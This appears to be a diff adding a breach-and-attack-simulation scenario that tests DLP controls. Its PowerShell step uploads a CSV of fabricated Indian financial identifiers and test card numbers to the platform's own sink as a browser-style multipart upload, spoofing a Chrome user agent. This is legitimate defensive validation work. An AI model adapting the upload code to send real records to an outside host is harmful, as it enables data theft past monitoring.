@@ -1,0 +1,82 @@
+id: dlp-exfiltration-browser-upload
+product_line: dlp
+name: DLP Exfiltration Validation — Browser-Style File Upload
+description: >
+  Uploads the same synthetic multi-type sensitive record used by the other DLP
+  scenarios (fabricated PAN, Aadhaar, SWIFT/BIC, UPI VPA and credit-card patterns)
+  to the platform's own sink as a browser-style multipart/form-data file upload:
+  a form field plus a file part named customer-records.csv, sent with a desktop
+  Chrome User-Agent. Verified by the sink's destination-side receipt, the same
+  model as dlp-exfiltration-sink-https.
+
+  Why a separate scenario from the JSON POST: web DLP and proxy products treat a
+  multipart file upload differently from a JSON body, and a browser upload is the
+  most common way a person moves a file out. This is a standalone scenario with a
+  single step on purpose: sink results are keyed by technique ID, so a second sink
+  step with the same technique could not be reported separately.
+
+  What this does NOT show: it is not a real browser (no extension, no cookie jar,
+  no TLS fingerprint of a browser), so a product that identifies browsers by
+  fingerprint may treat it differently from a person's upload.
+
+  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never real. The
+  sink stores only a hash of the received file, never the content. Windows only.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - dlp
+  - data-protection-validation
+  - exfiltration
+  - browser-upload
+  - windows
+  - mitre-attack
+  - bfsi
+  - india
+mitre_phases:
+  - collection
+  - exfiltration
+
+steps:
+  - name: "DLP Validation — Browser-Style Multipart Upload (T1567)"
+    technique_id: T1567
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Uploads a synthetic multi-type sensitive record, as a multipart file, to the platform's own sink endpoint over HTTPS. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
+    detection:
+      - "DLP: outbound HTTPS multipart upload whose file part matches regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      try {
+        Add-Type -AssemblyName System.Net.Http
+        $client = New-Object System.Net.Http.HttpClient
+        $client.Timeout = [TimeSpan]::FromSeconds(10)
+        $client.DefaultRequestHeaders.UserAgent.ParseAdd('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36')
+        $form = New-Object System.Net.Http.MultipartFormDataContent
+        $form.Add((New-Object System.Net.Http.StringContent('{{SINK_TOKEN}}')), 'token')
+        $form.Add((New-Object System.Net.Http.StringContent('browser-upload')), 'channel')
+        $file = New-Object System.Net.Http.ByteArrayContent(,[System.Text.Encoding]::UTF8.GetBytes($csvContent))
+        $file.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('text/csv')
+        $form.Add($file, 'payload', 'customer-records.csv')
+        $resp = $client.PostAsync('{{SINK_URL}}', $form).GetAwaiter().GetResult()
+        $resp.Dispose()
+        $client.Dispose()
+        Write-Output "EXEC T1567: multi-type sensitive record uploaded as a multipart file over HTTPS. [BAS-SIM-DLP-BROWSER-UPLOAD]"
+      } catch {
+        Write-Output "EXEC T1567: multipart upload to sink was blocked or failed before completing. [BAS-SIM-DLP-BROWSER-UPLOAD]"
+      }
+      # No local DLP_OBSERVATION marker here -- the verdict comes entirely from
+      # whether the sink endpoint received the token, resolved server-side by
+      # internal/verifysync, not from anything this script can confirm locally.
+    cleanup: ""
